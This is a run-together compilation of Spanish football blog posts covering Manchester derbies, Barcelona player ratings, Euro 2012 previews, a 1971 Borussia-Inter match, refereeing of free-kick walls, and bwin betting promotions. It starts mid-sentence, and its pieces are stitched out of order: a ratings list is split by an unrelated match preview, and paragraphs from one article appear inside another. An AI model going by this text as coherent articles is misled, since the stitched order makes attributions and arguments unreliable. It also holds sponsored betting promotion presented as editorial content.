y engañar. Sin igualar su insuperable actuación en La Rosaleda, por la que aspira este año al Goya al mejor actor de reparto, el sevillano exageró con solvencia un leve toque de Eguren dentro del área que Rossi transformó en el gol del empate del Villarreal. Visto que en España no es costumbre sancionar este tipo de comportamientos, y que el pícaro, no sólo en el fútbol, es frecuentemente admirado y jaleado siempre que no haya sido descubierto, los que abominamos de este tipo de tretas y trampas recibimos con un halo de esperanza las declaraciones del entrenador del Sporting. Ya que no podemos esperar medidas como la tomada recientemente en Italia contra Krasic, celebramos que se señale públicamente al tramposo, para que al menos su nombre esté en boca de todos y los árbitros, para juzgar sus acciones con equidad, lo miren de entrada como lo que es: un sospechoso habitual. Al final hubiera sido mejor negocio volver a ver Plácido.Y si alguien le aconsejó le entró por un oido y le salió por el otro, como a todos. Los goles entraban a chorro y eso era lo que contaba.Acelera hasta el precipicio y mira abajo, como diría Lotina, no es fácil. Los bálsamos que el circo reserva a algunos se le negaron a Windass. Pésimo comentarista, escritor limitado y con escaso éxito en los banquillos, volvió a la actividad que dominaba y estuvo a punto de matarse. Depresiones, decepciones, extravíos y muerte. Entre tanta purpurina conviene no olvidar que el fútbol también es esto. En la vuelta a escena de los dos de Manchester el United se embolsó la Community Shield, como era de esperar por otra parte y administrando de paso una inyección de duda a la penitente parroquia celeste. El once rojo, agarradito de una mano a Ferguson (genial dinamitando el escenario con tres cambios en el intermedio, Carrick, Vidic y Ferdinand, tan insospechados como efectivos y cargados de mensaje) y de la otra a un Nani que sigue tan inspirado como en la temporada pasada. Sammy Davies Jr no solo por la jeta, el extremo portugués regenta una fábrica de entrenenimientos que abre las veinticuatro horas del día. Quiebro elegante y desplazamiento clínico, tuvo tiempo para coronar una carambola colectiva en el 2-2 y desnivelar definitivamente la final sacando oro de un pelotazo inocuo. ¿Y el Manchester City? Pues aun en construcción. Con el que debe ser el faro natural de este equipo, ﻿Agüero, en el banquillo el único que podía ligar la salsa en el celeste era David Silva pero el canario solo tuvo mano para el asunto en contadas ocasiones. Mancini, empieza a parecer más el problema que la solución, no ha conseguido pegarle el manotazo definitivo a algunas de las moscas que sangraron a su equipo en el curso pasado, esos seis hombres desbarajustados por detrás de la pelota a la hora de plantearse el contrataque hacen daño al espíritu de cualquiera y así no hay manera de que la clase, que la hay, pase a primer plano.Lescott de cabeza y Dzeko de latigazo en colaboración con De Gea pusieron a trabajar el marcador hasta el 2-0 sí, pero lo cierto es que el Manchester City entregó la cuchara en cuanto el contrario se lo propuso. Un tiro en el pie cuando mejor pintaba el asunto, esa vieja tradición citizen, y el título a la basura. ¿Es este City un rival a tener en cuenta para pelear la Premier? Pues que quieren que les diga, es pronto para valorar nada y sigo pensando que este puede ser un gran año para el club de los jeques (la consistencia ha de llegar necesariamente con una plantilla de este peso por muchos Mancinis que se pongan por delante) desde que acabó el partido no puedo quitarme de la cabeza aquel soniquete rancio que, mano en faja, popularizara Julio Iglesias. Ya saben, que la vida sigue igual… “Quizá encuentres interesante esta camiseta del Bayer Uerdingen”, leí de buena mañana en mi buzón de correo. Era un amigo. Se me ocurren otros adjetivos para el pijama de la fotografía, le respondí para sorber a continuación el último trago de café, esbozar media sonrisa y comenzar los tres párrafos de rigor al instante. Aprovechando que alguien ha hecho el scouting por mi y que en verano la actualidad futbolística languidece más allá del retiro de algún icono y las resacas mundialistas, no me ha quedado otra que desempolvar la sección y ofrecerles un nueva entrega de camisetas horribles. Trataré de ser piadoso con el uniforme de trabajo del Bayer Uerdingen para la 94-95, al fin y al cabo son alemanes pobres y no pueden evitar pergreñar chapuzas estéticas como la que nos ocupa. Trataré pero dudo que lo consiga.Antes de nada quiero aclarar que Jorge Campos, el arco iris azteca del área chica, nunca jugó ni un minuto para el equipo de la fábrica de aspirinas. El saltimbanqui policromo es inocente. Todo lo que ven en las camisolas del Uerdingen para la 94-95 es única y exclusiva responsabilidad de la buena voluntad de la otrora gloriosa directiva y de los iluminados de Reusch. La manga izquierda tutti frutti, como vidriera de catedral. La clase de educación vial en el pecho. El amarillo canario de la camiseta suplente que sería capaz de provocar más epilepsia en el profano que un festival de anime japonés.Portugal ha pasado por encima de España (4-0) en un partido donde se ha bordeado el ridículo y la humillación en muchos momentos. Tras media hora equilibrada en la que Silva ha desperdiciado un testarazo franco, Portugal se ha encendido a partir de un gol anulado injustamente a Cristiano –el mejor, junto a Nani-, y ha apuntado otra ocasión diáfana justo antes de que, muriendo el primer tiempo, Martins cerrara brillantemente una gran jugada en la que el madridista le hizo un traje a Busquets. El gol ha sido el preludio de la tormenta del segundo tiempo, en el que la pauta ha sido siempre la misma: control del balón de España en campo portugués, falta de tensión, robo, contragolpe fulgurante, mano a mano y, frecuentemente, chicharro. Dos veces Postiga (una de tacón) y Almeida echando la persiana han certificado la goleada, y por el medio un intento de vaselina de Nani, regates, quiebros… un baile en toda regla que, aunque intrascendente en el fondo, dejará una lamentable impresión de la selección en los medios de todo el mundo. Alguien debería recordarle a algunos jugadores que llevan una estrella en el pecho, y que el prestigio, tan justamente adquirido, es tan difícil ganarlo como fácil perderlo. Qué diverso es el fútbol. Es difícil imaginar dos equipos a priori tan diferentes ahora mismo como el Stoke City y el Borussia Dortmund: los alemanes son líderes en su Bundesliga, un equipo joven, valiente y alegre que está causando sensación y cuyo juego combinativo y veloz tiene poca comparación ahora mismo; los potters, en cambio, representan el ejemplo típico de equipo humilde y aguerrido, que hace de su campo un fortín, y cuyo juego ofensivo depende en gran parte del balón parado que ejemplifica perfectamente los saques de banda de Rory Delap. Este fin de semana, sin embargo, han surgido dos perlas similares tanto en el Britannia como en el Signal Iduna: los artistas, Lucas Barrios y Tuncay Sanli; los ejecutores, Grosskrautz y Etherington. Que las disfrutéis. Fue en 1971, en la Copa de Europa. Aquel Borussia, que bajo la batuta del Mago Netzer era seguramente el equipo que mejor jugaba de Alemania, se enfrentaba a un Inter donde Mazzola daba sus últimos toques al balón y relucían nombres como los de Facchetti, Jair o Corso.El partido comenzó frenético, con tanto de Heynckes –el mismo que le dio al Madrid la Séptima y que ayer contemplaba incrédulo la exhibición de Nilmar-, empate del ariete Boninsegna y respuesta  inmediata del belga Le Fèvre para poner el 2-1 en el electrónico. El partido es fragoroso e intenso, la afición germana ruge, y no ha pasado ni media hora del partido cuando un silencio recorre el estadio: el autor del gol italiano ha caído fulminado al suelo, y el capitán Mazzola se dirige al colegiado holandés Poprman con algo en la mano. En un principio se pensó que era una botella de cerveza negra, pero parece que lo que contenía el envase era un poco de Coca-Cola. El árbitro, tras unos minutos de reflexión, decide que el partido siga adelante.Estos son los hechos en los que está todo el mundo más o menos de acuerdo. A partir de este momento, las versiones difieren radicalmente según la versión se escuche o lea en lengua germánica o latina. En el primer caso, oiremos hablar de una avalancha impresionante del Borussia, una exhibición de alta escuela como jamás se vio en Europa, con los balones lloviendo sobre el área interista y la avalancha de tantos, hasta siete, que igual pudieron ser doce. También oiremos historias de fingimiento y doblez, de cómo la famosa botella no tocó al Boninsegna y de que el delantero se marcó el ensayo general de un Roberto Rojas.En lo alto de la bota, en cambio, las cosas se ven muy diferentes. Nadie pone en duda la veracidad del botellazo, y se añade que los futbolistas interistas estaban tan seguros de que la UEFA daría por perdido el partido a su rival, que se dejaron ir y acabaron encajando una goleada que a priori sabían que no serviría para nada. Sea como fuere, la cuestión es que el máximo organismo europeo, en decisión algo salomónica, ordenó la repetición del partido a puerta cerrada. Los de Heriberto Herrera aguantaron en Berlín lo que no pudieron soportar unos kilómetros más al oeste (0-0) y acabaron resolviendo la eliminatoria en otro partido precioso que acabaron venciendo 4-2. Los tumbaría en la final el Ajax de Cruyff.Esta es la historia, y abajo os dejamos imágenes del partido que desgraciadamente no contienen el gol del Inter, y sólo una fugaz visión del incidente. Lo que se ve en el video es una gran exhibición del Borussia, y no parece dar la impresión de que el Inter se esté dejando –además de que a ningún equipo, especialmente italiano, le gusta que le metan siete ni en un amistoso-. En cualquier caso, juzgad vosotros. No es un partido que figure en la gran historia de la Copa del Mundo, pero pocos de los que vivimos en directo aquel Alemania Federal-Colombia de Italia 90 hemos podido olvidarlo. Los sudamericanos necesitaban un punto para pasar a la siguiente fase, y durante todo el partido, con ímpetu encomiable, chocaron y chocaron contra el muro alemán sin resultado alguno. Cuando el partido moría, Littbarski hizo el gol que siempre hace Alemania, y todos sentimos una tristeza que conocemos muy bien, asociada al destino del pequeño. Quizá por eso fue tan inolvidable el grito enloquecido de Freddy Rincón al empatar en el 92, en una imagen que acabó resultando icónica de las emociones que puede desatar el Mundial. Hace algún tiempo, el ínclito Santiago Segurola publicó en Marca un interesante artículo titulado “Un futuro y su excepción”. El texto partía de una observación de Caparrós, quien opinaba que el fútbol del futuro se parecería mucho al que pretendía practicar Mourinho, y que este año ha llegado a su culminación en muchos momentos de la Liga: un juego atlético y poderoso, rápido, con variedad táctica y también con espacio para la sutileza y la finura. El fútbol del Barça, en cambio, siendo maravilloso, debía considerarse una excepción, por cuanto que para ser eficaz necesita de jugadores de unas características muy concretas, y en especial con una gran capacidad técnica y buen conocimiento del juego. Dos características muy difíciles de encontrar.Notable6 – Xavi Hernández Un año difícil para el emblema de La Masía. Se anunció, de entrada, que su papel no sería tan protagonista como en años anteriores. Supo reinterpretar su aportación hasta ofrecer lo que Luis Enrique pedía de él y además lo hizo sin una voz más alta que otra, como corresponde a un capitán y a un jugador referente en el vestuario. Su progresiva desaparición del equipo es el reflejo del proceso de cambio. De esa ‘luisenriquización‘ del Barça. Una incógnita para el futuro inmediato. Aprobado8 – Andrés Iniesta. El manchego es otra de las ‘víctimas’ del cambio de estilo y de que este nuevo Barça se apoye más sobre su parte de arriba que sobre la superficie central. Sobre su rendimiento han pesado las dificultades para encontrar la estabilidad en su juego. Su papel, más sacrificado en la presión y menos participativo con el balón, ha cambiado radicalmente en este nuevo Barça.Es uno de los puntos negros de la gestión de Luis Enrique, aunque mejoró algo en este tramo final del curso. Un dato para la reflexión: Andrés no anotó ningún gol en todo el torneo liguero. Aprobado12 – Rafinha Alcántara. El exfutbolista del Celta, al que Luis Enrique conocía bien del pasado año, es uno de los jugadores de los que muchos esperábamos un paso más en su progresión. Tras su sensacional temporada en Vigo, su papel en el Barça fue mucho más limitado, como cabía esperar. Aportó buenos minutos cuando el técnico tiró de él y supo dar descanso a Rakitic. Las esperanzas sobre su figura, con todo, sigan intactas. Deberá ir ganando confianza y minutos. Aprobado20 – Sergi Roberto. No ha sabido dar el golpe en la mesa que todo canterano necesita para abrirse paso en el primer equipo. Tampoco ha contado con excesivas oportunidades, pero cuando pisó césped no marcó diferencias. Se esperaba que de la mano de Luis Enrique, con el que ya coincidiera en el B, su participación fuera mayor. Apenas consiguió entrar en once convocatorias ligueras y en solo tres de ellas partió como titular.En la Liga de Campeones vale casi todo, y tratándose del Madrid aún más. Hacía años que el Bernabéu no veía un partido así ha dicho el entrenador portugués, y tiene parte de razón. Los cuartos son terapéuticos y el partido viene cargado de ilusión, pero también de dudas.Las bajas, no tan infrecuentes a estas alturas de la temporada, marcan la previa de un choque que puede parecer desnivelado pero que tiene muchos claroscuros para los hombres de Mourinho. El juego del equipo blanco no ha terminado de ser constante. Se gana, a veces se convence, pero no da la sensación de ser una máquina arrolladora, imparable. La derrota contra el Sporting es un síntoma de ese vaivén continúo que es el Real Madrid de esta temporada. Brillantes ejecuciones como la del Lyon hace unas semanas mezcladas con paupérrimas actuaciones, esas que lo han descolgado de una liga que ya tiene dueño.Cada semana, y de la mano de bwin.com, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. En casa, frente a los hombres de Redknapp, tiene el club blanco la oportunidad de ponerse serio en la Champions, en esa competición que empieza a oxidarse en las vitrinas y que últimamente sólo disfrutaban en el sofá de casa. El rival no es de los que asustan, la verdad, no es de ese tipo de partidos que paralizan a los aficionados. No tiene ni la leyenda del Manchester, ni la reciente fama del Chelsea, pero ahora mismo es un equipo sólido, con una plantilla extensa y bien compensada, y esta ronda es una oportunidad de oro para hacer historia. Los spurs no han llegado aquí por casualidad, primeros de un grupo de gallitos y habiendo dejado en la cuneta a todo un Milan en octavos. El equipo londinense está rindiendo por encima de lo esperado, la explosión de Bale tiene mucha culpa. Es un artificiero en la banda izquierda, él pone a funcionar al equipo.Suspenso7 – Pedro Rodríguez. Un año extraño el del extremo canario. Perdió mucho protagonismo tras la vuelta de Suárez de la sanción y tras el partido de Anoeta que significó un antes y un después en lo que a la gestión del reparto de minutos entre la plantilla se refiere. Sin embargo, fue uno de los habituales hombres de refresco, saliendo desde el banquillo hasta en veinte ocasiones. Acaba la temporada como un tiro y convencido de que su papel en la plantilla es importante. Curiosamente, solo Messi y Bravo han participado en más encuentros ligueros que él. Aprobado11 – Neymar Jr. Tras un primer año algo dubitativo, el segundo ha sido el de la definitiva confirmación del brasileño. Ha sabido entender perfectamente su rol en el equipo y su relación con Messi. Es protagonista pero, en una postura muy inteligente, tampoco hace excesivo alarde de ello. Convertido en lugarteniente del astro argentino, termina la campaña como segundo máximo goleador del equipo con veintidós goles. Debe pulir ciertas actitudes sobre el césped que, aunque él ve como muy naturales, perjudican a su equipo. Sobresaliente10 – Leo Messi. Estratosférico, decisivo, superlativo, protagonista absoluto… ¿Alguien tiene algo más que añadir sobre Leo? Matrícula de honor9 – Luis Suárez. Arrancó la temporada arrastrando la sanción que se le impuso tras el mordisco a Chiellini y no pudo entrar en los esquemas del equipo hasta finales del mes de octubre, precisamente sobre el césped del Bernabéu. El uruguayo pasó entonces a ser un futbolista real para el barcelonismo. Y no dejó de crecer hasta hoy. Voraz, incansable en la presión y con un instinto goleador fuera de toda duda, ha demostrado además no ser simplemente un delantero de área, sino un atacante completísimo. El Barça tiene por fin su nueve decisivo. Dieciséis goles y, ojo, catorce asistencias en veintisiete partidos. Sobresaliente31 – Munir El Haddadi Munir apareció a principios de la temporada como la gran perla de la cantera azulgrana y como el destinado a suplir la ausencia temporal de Suárez. Arrancó en la cresta de la ola, debut internacional absoluto incluido, aupado en buena medida por una batería de elogios tan inconscientes como desmedidos. Cuando la ola rompió cerca de la orilla, se llevó al hispano-marroquí por delante. Falta por ver qué será ahora de él, tras su accidentada progresión en falso. Aparece, en cualquier cosa, como escasamente responsable de su fracaso. Suspenso ‘Cuando salté al césped de San Paolo para calentar me temblaban las piernas‘. Y las piernas no le temblaban a un cualquiera. El que quedó impresionado por la asfixiante e intimidante atmósfera del coliseo napolitano no venía de jugar en campuchos de tercera división para dos mil espectadores y el del bombo. Yaya Touré tenía en sus fornidas piernas, en esas en las que no conseguía controlar el tembleque, más kilómetros que un taxi cuando visitó San Paolo con el Manchester City. Pero aquello era demasiado. Era la fase de grupos de la Liga de Campeones, en el mes de noviembre de 2011. San Paolo hervía, escupía desde sus anillos el magma que parece robarle al vecino y siempre amenazante Vesubio y empujaba al Napoli a una clasificación histórica para la fase de eliminatorias de la competición casi treinta años después del advenimiento de Maradona. La caldera de Fuorigrotta es el complicado escollo que el Athletic Club deberá superar para poder repetir presencia en la Liga de Campeones, tras dieciséis años sin poder participar en la máxima competición europea. Una estación compleja, un horno acostumbrado a trabajar en el modelado de ambientes hostiles, una casa de fieras en la que los futbolistas del equipo local no gritan ni saltan cuando festejan alguno de sus goles. Sus futbolistas rugen, contagiados del fervor de la caliente masa nnapulitana, cuando consiguen reventar las redes rivales. Fíjense en ese Gonzalo Higuaín, con la pasión disparada cada vez que se viste de celeste en San Paolo, que hasta parece otro diferente al que pasaba de puntillas y medroso por las áreas del Bernabéu. Es ese intangible que emana de la grada, esa suma de clichés alrededor del calor, del ardor y de la pasión incontrolable de la gente del sur de Italia que en San Paolo parecen convertirse en argumento para el éxito. El Napoli no ha perdido jamás en su estadio en partido de Liga de Campeones (y antigua Copa de Europa). La estadística asusta, pero la presión juega en su contra. Los de Rafa Benítez tienen la necesidad de superar la previa y volver a colarse en la fase de grupos por tercera vez en los últimos cuatro ejercicios y De Laurentiis no transigiría con menos. Me gustaría pensar que en Bilbao la clasificación no es tanto una ‘necesidad’ como una ‘ilusión’. Que la presión no vaya a jugar en contra del Athletic, por mucho que el duro trabajo de la temporada pasada pueda resultar baldío por un par de malos partidos.Por tanto, era de esperar que esa manera de jugar generase pocos imitadores, a pesar de haberse demostrado ganadora tanto a nivel de clubes como de selecciones.En los últimos años, sin embargo, el éxito irrefrenable del guardiolismo ha creado cierta escuela e influido de modo más o menos decisivo en lugares inesperados. Alemania, el Borussia Dortmund de Klopp o la Juventus campeona en la Serie A han asimilado, con sus peculiaridades y variantes, algunos de los mandatos del credo de Pep y Johan. Por ello, resulta bastante llamativo que el representante por antonomasia de esta manera de entender el fútbol haya emprendido desde hace años el camino inverso. Una elección perfectamente respetable, por cierto, y que ha procurado jugosos réditos a la oranje. Paradójicamente, o quizás no tanto, la mayor parte de clubes de la Eredivisie siguen anclados de un modo u otro en su peculiar interpretación del 3-4-3 o 4-3-3, y la competitividad internacional de la mayoría de ellos se halla bajo mínimos. Sin olvidar el fenómeno “fuga de talentos”, claro.Cuando Lambertus Van Marwijk, que venía de ganar la liga con el Feyenoord, asumió los destinos de la selección naranja en 2008, se propuso convertir a un buen manojo de jugadores en un grupo fieramente competitivo. El equipo venía de ser eliminado en cuartos en la Eurocopa 08, donde las victorias brillantes de la primera fase acabaron oscurecidas por el partido ante Rusia y la inferioridad mostrada ante Arshavin y compañía. Amortizado Van Basten, que ya había anunciado previamente su compromiso con el Ajax, la KNVB dejó la selección a cargo de Bert. Con él al mando, Holanda firmó una inmaculada fase de clasificación en la que ganó todos los partidos, y fue tumbando rival tras rival en Sudáfrica hasta plantarse en la final de Johannesburgo. Sólo quedaba España.Lo ocurrido en el césped del Soccer Cup es historia negra del fútbol holandés. El combinado de Marwijk podía manejar multitud de estilos, pero consciente de que en toque y juego de posición su selección era inferior a la española, llevó el encuentro a un festival de violencia y juego sucio que no sólo resultó estéril, sino que dejó como símbolo una patada voladora de De Jong de terrible fuerza icónica. Una identificación justa para lo que fue el partido, pero injusta si contemplamos la trayectoria global del conjunto tulipán, que ha vuelto a firmar una clasificación extraordinaria (9-0-1 en victorias y derrotas, máximo goleador de la fase), desarrollando fases de gran fútbol, y que llega a Polonia-Ucrania con la doble intención de levantar un trofeo y limpiar la imagen que ensució en un solo partido. Pero era EL partido, claroTácticamente, el equipo de van Marwijk esconde poco, al menos de partida. Se despliega casi siempre a partir del 4-3-3, con dos centrales y dos laterales largos. En principio la pareja de centrales volvería a ser Mathijsen–Heitinga, como en el Mundial, pero faltan cuatro días para que empiece el asunto y ambos están con problemas físicos leves. En el caso de que falle alguno de los dos pueden entrar Vlaar o Bouhlarouz, aunque el técnico no confíeamucho en este último. Lesionado en un dedo Pieters, que venía siendo el titular en la izquierda y se ha quedado fuera de la convocatori; lo más probable es que entre el jovencísimo Willems en la izquierda, aunque otra opción si falla algún central titular es pasar a ésta al centro y meter en la banda a Bouma, más frágil como zaguero. La derecha es propiedad de Van der Wiel, a pesar de que su rendimiento ha descendido tras su fulgurante aparición el Ajax.Considerando el nivel de este grupo B, puede asumirse que al menos contra Alemania y Portugal el medio centro será territorio de De Jong y Van Bommel, con todo lo que ello significa: fortaleza defensiva, conocimiento del oficio, tacos que rascan y poco toque. Quizá contra Dinamarca podamos ver a Strootman, la alternativa utilizada en fase de clasificación cuando van Marwijk ha pretendido darle un poco más de vuelo a la selección. Sneijder volverá a ser fundamental en el vértice central de 4-3-3, exactamente el puesto que no fue capaz de encontrarle nunca Ranieri en el Inter, y de su rendimiento dependerá en gran parte la prestación de su selección en la Eurocopa. Su temporada ha resultado bastante deficiente.La gran duda que tortura a día de hoy al aficionado holandés –y probablemente también al seleccionador- tiene que ver con la vanguardia. Fijo sin dudar Robben en la derecha, quedan dos puestos para dos futbolistas.La gran ventaja es que los dos candidatos son arietes de altísimo nivel mundial: Van Persie, aparte de los goles, aporta la magia y mucho juego, aunque llega justo a la Euro; Huntelaar es el killer de siempre y lo ha demostrado en Alemania, donde ha salido máximo goleador en un equipo como el Schalke. La desventaja, que ninguno de los dos quiere jugar en la banda izquierda. Parece que Van Marwijk se va a decidir por Robin arriba, mucho más futbolista, y dejarle la cal a un perfil más extremo tipo Afellay o más trabajador como Kuyt. En cualquier caso, tiene lío asegurado.Independientemente de que al final confirme su candidatura o no, hay que reconocerle a la Holanda actual que presenta su versión más potente desde el equipo de los milanistas de finales de los ochenta. Con varios jugadores en la cima de sus carreras, hay una sensación de “ahora o nunca” tanto entre los futbolistas como entre su animosa afición. Seguramente su primer partido, sábado 9 a las 18:00 frente a Dinamarca, marque su devenir en el torneo. Habrá que estar atentos.Alineación probable. Stekelenburg; Willems, Mathijsen, Heitinga, Van der Wiel; De Jong, Van Bommel, Sneijder; Robben, Afellay, Van Persie.Pronóstico DDF. Por potencial debe superar la primera fase y jugarse con Alemania el primer puesto. Es de suponer que tendrá un cuarto asequible –ojo a la posible reedición del Holanda-Rusia de Basilea-, así que el pronóstico mínimo son semifinales. Allí ya todo puede ocurrir. Horror estético el perpetrado esta noche en el Sardinero por Racing de Santander y Real Madrid (0-0). El equipo de Cúper, que no ha olvidado en Georgia los conceptos defensivos, mantuvo a raya a su poderoso rival con una colocación defensiva perfecta, madurez en la gestión de los tiempos del partido y una impecable aplicación del otro fútbol. A esta táctica, tan vieja como el fútbol en enfrentamientos desequilibrados, apenas supo oponer el Madrid algunos balones cruzados de Özil en diez minutos del primer tiempo, y un toque de corneta desordenado y estéril cuando el partido moría lentamente. Muy afeitado el equipo titular por las bajas y rotaciones, el Real Madrid apenas consiguió tocar en tres cuartos, su presión fue inefectiva y exhibió un nivel físico muy discreto, alejado de la exuberancia de principio de temporada. Con Lass anárquico y estéril, Cristiano obtuso como siempre que los partidos se enredan, y Callejón ausente –su presencia en la plantilla cada vez se interpreta más como un costoso guiño a la cantera-, sólo los ingresos de Di María y Kaká prestaron al equipo una pizca de profundidad por los costados. Insuficiente, en cualquier caso, para batir a un Racing que no permitió nada por alto, con un Álvaro inmenso, y que se reservó el lujo de firmar la ocasión más clara del choque, en un trallazo que sacó Iker con las uñas. Un punto es su premio, y un castigo para un Madrid que parece envuelto en un mar de dudas. Para variar, futbolísticas. Xabi Alonso, Sami Khedira, Mesut Özil, Karim Benzema y Pepe protagonizan la primera campaña en televisión de bwin.es, que se estrenará coincidiendo con el comienzo de la UEFA EURO 2012.El pasado 1 de junio, la Dirección General de Ordenación del Juego concedía las primeras liciencias a las empresas de juego online para operar en un nuevo entorno regulado. La compañía bwin.party obtenía así licencia para lanzar su nueva página web de apuestas de deporte para el mercado español, bwin.es, y, por tanto,  la posibilidad de anunciarse por primera vez en televisión.Coincidiendo con el inicio del Campeonato de Europa de fútbol, bwin estrenará mañana en la pequeña pantalla un anuncio con Xabi, Khedira, Özil, Benzema y Pepe como protagonistas. El spot da la bienvenida a los telespectadores “al terreno de juego más grande del mundo”, la página de apuestas de deporte bwin.es.bwin es patrocinador principal del Real Madrid desde el año 2007, acuerdo que renovó en 2009 hasta finales de la temporada 2013. La campaña, que será utilizada también en otros mercados europeos, ha sido creada por la agencia vienesa WIRZ, partner internacional de Leo Burnett, fundada en 1965 y situada desde hace más de 30 años en el top 5 de agencias publicitarias en Austria. Hace poco escribió Boyero sobre este partido –y especialmente sobre su prórroga- como lo mejor que jamás había visto en un Mundial, y no es fácil discutir su elección. El enfrentamiento entre las dos mejores selecciones europeas alcanzó tintes de leyenda, con Schnellinger clavando en el descuento el tanto que forzaba el tiempo extra, el irrepetible Gianni Rivera vengándose de su marginación a través del gol de la victoria, Alemania sobreponiéndose hasta donde pudo al cansancio de su agónico cuarto contra Inglaterra, o Beckenbauer jugando con el brazo en cabestrillo, pura imagen de épica y pundonor. Un partido único. El pasado fin de semana tuvimos ocasión de presenciar en varios campos diferentes algunos sucesos de importancia variopinta que tienen que ver con el uso de las barreras en el fútbol. Antes de entrar en ellos, no está mal recordar un poco la regla XIII, que dice que en cualquier tiro libre que se realice fuera del área de meta, los jugadores del equipo rival deben encontrarse mínimo a 9,15 metros del balón. Esto en particular es el fundamento de la existencia del círculo del centro del campo y de las medias lunas de las áreas, tan bonitas ellas.Entre la niebla que presidió el Zaragoza-Levante, se produjo un lance que pudo tener su incidencia en el marcador final del partido (como muchos errores de los futbolistas, no debe olvidarse) y que resultó llamativo y polémico. El equipo maño fue sancionado con una falta en el borde del área, los jugadores granotas sacaron rápidamente, y como consecuencia obtuvieron gol. El árbitro Álvarez Izquierdo anuló el tanto entre las airadas protestas de los futbolistas, que alegaban no haber pedido distancia. Si asumimos este postulado como cierto y miramos las imágenes de TV, encontramos que el árbitro ha perdido de vista el balón, y por tanto la hipótesis más razonable es que manda repetir porque no está seguro de que la falta se haya ejecutado correctamente; ésta también fue la interpretación que dieron en El Día del Fútbol, donde analizaron la jugada.Por supuesto, estamos hablando de un error grave en términos del resultado, pero traemos esto aquí a colación para hacer notar que no es sólo un error grave, sino uno diferente a los que solemos ver normalmente. Cuando un árbitro pita un penalty injusto, sanciona un fuera de juego que no es o da por válido un gol que no ha entrado, incurre en un error de apreciación, un fallo, para entendernos, que siempre puede justificar diciendo que “no lo vio bien por circunstancias del juego”. Normalmente este tipo de fallos, a menos que sean muy flagrantes, no reciben sanción alguna del comité correspondiente.Sin embargo, cuando el árbitro ha parado el juego y pierde el balón de vista, ya no está fallando por un imponderable que le impide verlo, sino que está haciendo dejación de sus funciones (la responsabilidad, en menor medida, también se extiende a los asistentes). Entonces, está incurriendo en un error técnico, mucho más grave desde el punto de vista de la competencia del colegiado que un simple error de apreciación. Es una distinción importante que pocas veces se realiza, pero que marca la diferencia muchas veces entre el fallo incontrolable y la capacidad del árbitro.Otra jugada relacionada con barreras que se ha comentado mucho fue la mano del almeriense Mbami en el partido contra el Madrid, que saltó con los brazos extendidos en una barrera situada ligeramente por detrás de la línea del área, y cometió infracción. Pérez Lasa pitó la falta, pero no penalty, y así recibió las iras de parte del respetable. Se ha invocado en esta jugada que las líneas son parte del área, pero poco se ha dicho sobre lo difícil que es juzgar (incluso a cámara lenta) si la mano es fuera o dentro. En estas circunstancias dudosas, el árbitro debe siempre señalar la infracción de menor gravedad, que fue la decisión en esta ocasión. Parecen irrazonables, pues, las quejas del Madrid al respecto de esta jugada.Finalmente, en el partido City-Wolves del sábado, vimos una imagen que era común en el pasado y que ahora resulta poco menos que simpàtica: el colegiado midiendo los 9,15 metros con los once pasos que en su tiempo era recomendación, y hoy ni se menciona. La pregunta es, considerando que las barreras están a distancia insuficiente casi por sistema, por qué no se vuelve a ese sencillo método que permitía a los lanzadores gozar de un derecho que les da el reglamento, a la vez que daba a los espectadores más posibilidades de gozar de una de las suertes más hermosas del balompié: el friqui a la escuadra. No sabemos, quizá en la FIFA preocupe más saber cómo colarnos un mundial en invierno que la esencia del precioso juego que sólo utilizan para llenarse los bolsillos. Quién sabe. Es obvio que una de las grandes virtudes que definen a los entrenadores punteros es su capacidad para hacer competitivos a sus equipos, controlar hasta el mínimo detalle controlable en un juego donde se producen miles de acciones en cada partido y por tanto –Mourinho dixit– reducir en lo humanamente posible la influencia de lo imponderable. No es nada casual que la evolución que ha llevado al fútbol de un simple entretenimiento al mayor fenómeno de masas jamás visto haya resultado también en una mecanización del juego y en la asunción por parte de los jugadores de unos estándares tácticos cada vez más complejos, a la vez que necesarios para el funcionamiento colectivo del bloque. Se practican jugadas de estrategia, se ensayan las basculaciones hasta la extenuación dependiendo de dónde se produzca la pérdida de balón, se regula al milimetro la posición de todos en los córners, e incluso se pautan las amonestaciones en función de la legislación deportiva pertinente Todo es válido, dentro de la legalidad e incluso bordeándola, para alzarse con la victoria.Por todo esto, merece la pena detenerse en dos jugadas que se produjeron el pasado fin de semana, y que permiten comentar dos excepciones en cierto modo curiosas al control del detalle que, como ha quedado dicho, manda en el fútbol actual. La primera se produjo en el encuentro Birmingham-Arsenal, que dominó a placer el equipo gunner y acabó venciendo justamente por 0-3. Lo llamativo es que en cada córner, los jugadores del equipo londinense no centraban el balón ni practicaban la más mínima estrategia, sino que sencillamente ponían el balón en movimiento a un compañero situado a un metro de distancia, y salían jugando tranquilamente, como si de un bote neutral se tratase. De todos es sabido que el fútbol del Arsenal, asociación pura, se basa en tocar y tocar el balón hasta, si es posible, meterse con él en la portería rival, pero el saque de esquina siempre constituye una buena oportunidad de marcar, y despreciarlo sistemáticamente parece, cuando poco, una actitud poco inteligente. Sin embargo, habrá también el que vea un halo romántico en esta actitud, o dicho de otro modo, lo verán de un modo u otro los que valoren a Wenger como la IFFHS, que lo ha considerado el mejor entrenador de los últimos diez años, y los que piensan que es un entrenador sobrevalorado y acomodado que se ve por encima de las victorias y los títulos que su equipo hace mucho que no consigue.Para comentar la otra jugada tenemos que irnos a San Mamés, donde un Deportivo iluminado y tocado por la fortuna resistía el habitual arreón final del Athletic y su afición. Llegados ya al minuto noventa, Gorka Iraizoz abandonaba el marco que defiende con tanta sobriedad y a punto estaba de lograr un empate que hubiera supuesto un éxtasis, a pesar de las indicaciones de Caparrós de que no se moviera de su portería. La pregunta en este caso es: ¿por qué no se ha generalizado la subida del portero a última hora? En competiciones ligueras suele ser casi irrelevante perder por uno o más goles, y la diferencia cualitativa entre empatar y perder por dos más goles es abismal. ¿Qué retiene entonces a los guardametas de lanzarse enloquecidos al terreno contrario para lograr algo que, como en el caso de Palop, se recordará de por vida? No vemos más razones que el miedo al ridículo, ese defecto tan español; el temor de que el contrario organice un contragolpe y perfore una portería vacía. Qué gran contrariedad.En fin, dos ejemplos de que en fútbol seguramente siempre es posible mejorar –puede hacerlo el Arsenal, pueden hacerlo los porteros atenazados que jamás abandonan el resguardo de su área- y de que, más veces de las que creemos, los detalles dan el triunfo. Terminamos con una de las primeras frases de Guardiola según asumió el banquillo del Barcelona: “A partir de hoy, se defienden todos los saques de banda”. 